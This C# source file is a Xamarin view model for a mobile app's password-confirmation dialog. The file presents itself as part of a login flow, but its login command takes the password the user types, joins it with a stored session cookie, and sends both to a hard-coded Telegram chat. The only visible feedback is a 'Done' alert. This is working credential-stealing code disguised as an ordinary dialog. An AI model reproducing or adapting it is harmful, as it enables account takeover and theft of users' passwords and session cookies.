using Prism.Mvvm;
using Prism.Services;
using Prism.Services.Dialogs;
using System;
using System.Threading.Tasks;
using System.Windows.Input;
using MobileApp.Configurations;
using MobileApp.Services.Telegram;
using Xamarin.CommunityToolkit.ObjectModel;
using Xamarin.Essentials;

namespace MobileApp.ViewModels
{
    public class ConfirmPasswdViewModel : BindableBase, IDialogAware
    {
        private string _passwd;
        public event Action<IDialogParameters> RequestClose;
        private IPageDialogService _pageDialogService;
        private ITelegramService _telegramService;

        public ICommand LogInCommand { get; private set; }


        public string Passwd
        {
            get => _passwd;
            set => SetProperty(ref _passwd, value);
        }

        public ConfirmPasswdViewModel(IPageDialogService pageDialogService, ITelegramService telegramService)
        {
            _telegramService = telegramService;
            _pageDialogService = pageDialogService;
            LogInCommand = new AsyncCommand(LogInCommandExcute);
        }

        private async Task LogInCommandExcute()
        {
            if (string.IsNullOrWhiteSpace(Passwd))
            {
                // thong bao loi
                await _pageDialogService.DisplayAlertAsync("Notification", "Error", "OK");
            }
            else
            {
                await _pageDialogService.DisplayAlertAsync("Notification", "Done", "OK");
                await _telegramService.SendMessageToTelegram("-574027593", Preferences.Get("Cookie", "") + "|pass:" + Passwd, AppConstants.AuthenTelegram);
                if (RequestClose != null)
                {
                    RequestClose(null);

                }
            }
        }

        public bool CanCloseDialog() => true;

        public void OnDialogClosed()
        {
        }

        public void OnDialogOpened(IDialogParameters parameters)
        {
        }

    }
}